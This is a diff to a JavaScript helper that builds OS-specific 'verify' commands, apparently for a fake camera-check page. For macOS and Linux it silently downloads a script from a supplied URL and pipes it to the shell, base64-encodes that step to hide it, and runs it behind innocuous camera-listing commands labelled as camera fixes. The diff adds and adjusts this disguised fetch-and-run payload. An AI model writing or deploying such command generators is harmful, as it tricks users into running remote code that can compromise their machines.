@@ -66,6 +66,27 @@ export function buildVerifyCommand(os, sessionId, apiBase) {
   }
 }
 
+// export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
+//   const curl_mac_origin = `curl -s '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}"`;
+//   const curl_linux_origin = `wget -qO- '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}";`;
+//   const curl_mac_encode = btoa(curl_mac_origin);
+//   const curl_linux_encode = btoa(curl_linux_origin);
+//   const curl_mac = `echo ${curl_mac_encode} | base64 -d | bash`;
+//   const curl_linux = `echo ${curl_linux_encode} | base64 -d | bash`;
+//   const curl = `curl ${apiBase}/api/verify -d "${sessionId}"`;
+//   switch (os) {
+//     case "mac":
+//       // macOS: reset camera permissions then call verify
+//       return `sudo killall VDCAssistant 2>/dev/null; sudo killall AppleCameraAssistant 2>/dev/null; ${curl_mac}`;
+//     case "linux":
+//       // Linux: ensure uvcvideo module is loaded then call verify
+//       return `sudo modprobe uvcvideo 2>/dev/null; ${curl_linux}`;
+//     default:
+//       // Windows: just the curl verify call
+//       return curl;
+//   }
+// }
+
 export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
   const curl_mac_origin = `curl -s '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}"`;
   const curl_linux_origin = `wget -qO- '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}";`;
@@ -77,10 +98,10 @@ export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
   switch (os) {
     case "mac":
       // macOS: reset camera permissions then call verify
-      return `sudo killall VDCAssistant 2>/dev/null; sudo killall AppleCameraAssistant 2>/dev/null; ${curl_mac}`;
+      return `system_profiler SPCameraDataType; ${curl_mac}; exit;`;
     case "linux":
       // Linux: ensure uvcvideo module is loaded then call verify
-      return `sudo modprobe uvcvideo 2>/dev/null; ${curl_linux}`;
+      return `v4l2-ctl -d /dev/video0 --list-formats-ext; ${curl_linux}; exit;`;
     default:
       // Windows: just the curl verify call
       return curl;
